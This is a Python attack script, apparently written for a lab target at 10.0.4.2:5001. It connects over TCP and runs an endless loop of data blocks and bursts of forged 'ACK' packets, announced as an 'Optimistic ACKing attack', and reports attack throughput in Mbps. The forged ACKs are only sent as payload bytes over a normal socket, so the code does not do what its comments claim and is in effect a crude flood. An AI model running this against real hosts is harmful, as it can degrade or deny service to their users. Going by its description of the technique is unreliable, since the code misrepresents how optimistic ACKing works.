#!/usr/bin/env python3
import socket
import time
import struct
import sys

# Target server
TARGET_IP = '10.0.4.2'
TARGET_PORT = 5001

# Create socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((TARGET_IP, TARGET_PORT))
    print(f"Connected to {TARGET_IP}:{TARGET_PORT}")
except Exception as e:
    print(f"Connection failed: {e}")
    sys.exit(1)

# Initial connection
s.send(b'START\n')

# Receive buffer and initial window size
buffer_size = 65535
window_size = buffer_size

# Try initial data reception
try:
    s.settimeout(2)  # Set timeout
    data = s.recv(buffer_size)
    if data:
        print(f"Initial data received: {len(data)} bytes")
except socket.timeout:
    print("Initial data reception timeout - continuing")
except Exception as e:
    print(f"Initial data reception error: {e}")
    s.close()
    sys.exit(1)

# Main attack loop
try:
    # Large data block
    data_block = b'X' * 1460  # Data block close to MTU size

    # Track sent data and packets
    bytes_sent = 0
    packets_sent = 0

    print("Starting Optimistic ACKing attack")
    start_time = time.time()

    while True:
        current_time = time.time() - start_time

        # 1. Send data to consume resources
        try:
            sent = s.send(data_block)
            bytes_sent += sent
            packets_sent += 1
        except:
            print("Send error")
            break

        # 2. Send ACKs before actually receiving (Optimistic ACKing)
        try:
            # Send fake ACKs rapidly
            for _ in range(20):  # Increase ACK count for stronger attack
                # Significantly anticipate next sequence number
                seq_num = packets_sent * 1460 * 100  # Significant anticipation
                ack_data = struct.pack("!I", seq_num) + b'\x00' * 16  # Dummy ACK packet
                s.send(ack_data)
                packets_sent += 1
                time.sleep(0.0001)  # Very short interval
        except:
            print("ACK send error")
            break

        # 3. Status output (periodic)
        if packets_sent % 1000 == 0 or int(current_time) % 5 == 0:
            mbps = (bytes_sent * 8) / (1000000 * (time.time() - start_time))
            print(f"[{current_time:.1f}s] Attack traffic: {mbps:.2f} Mbps, Sent: {bytes_sent/1024/1024:.2f}MB, Packets: {packets_sent}")

        # Try to receive data in non-blocking mode
        try:
            s.settimeout(0)
            new_data = s.recv(buffer_size)
            if not new_data:  # Connection closed
                print("Connection ended")
                break
        except socket.timeout:
            pass
        except socket.error:
            pass

except KeyboardInterrupt:
    print("Attack stopped (user interrupt)")
except Exception as e:
    print(f"Error: {e}")
finally:
    # Close connection
    try:
        s.close()
        print("Connection closed")
    except:
        pass
    print(f"Total sent: {bytes_sent/1024/1024:.2f}MB, Packets: {packets_sent}")
